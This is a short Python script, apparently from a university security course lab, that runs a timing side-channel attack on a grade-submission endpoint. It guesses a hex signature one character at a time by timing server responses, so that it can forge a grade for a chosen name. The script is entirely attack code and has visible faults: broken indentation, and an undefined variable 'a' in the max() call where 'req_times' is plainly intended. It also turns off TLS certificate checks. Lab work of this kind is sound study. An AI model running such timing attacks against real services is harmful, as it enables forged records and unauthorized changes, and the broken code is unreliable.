import requests
from sys import argv
requests.packages.urllib3.disable_warnings()

def get_req(url, payload):
     return requests.get(url, params=payload, verify=False)
 
# https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature=6823
def brute_force(name, grade, string="0123456789abcdef", length=20):
    sign = "" #6823ea50b133c58cba36
    url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?"
    payload = {"name": name, "grade": grade, "signature": sign}
    ver = False
    while not(ver):
        sign = ""
        while len(sign) < length:
            req_times = {}
                for char in string:
                    try_sign = sign + char
                    payload["signature"] = try_sign
                    req = get_req(url, payload)
                    req_times[try_sign] = req.elapsed.total_seconds()
            sign = max(a, key = a.get)
        payload["signature"] = sign
        req = get_req(url, payload)
        ver = req.text.strip() == "1"
    print("Request: ?name={}&grade={}&signature={}".format(name, grade, sign))
    print("Signature valid: {}".format(req.text.strip() == "1"))
    print("Name: {}, Grade: {}, Signature: {}".format(name, grade, sign))
    return sign

if __name__ == '__main__':
    if len(argv)  == 3:
        name = argv[1]
        grade = argv[2]
    else:
    # brute_force("Jonathan", 3)
        name = input("Choose name to change grade on: ")
        grade = input("Choose grade: ")
    print("Calculating signature for name: {} and grade: {}".format(name, grade))
    # brute_force("Kalle", 5)
    brute_force(name, grade)
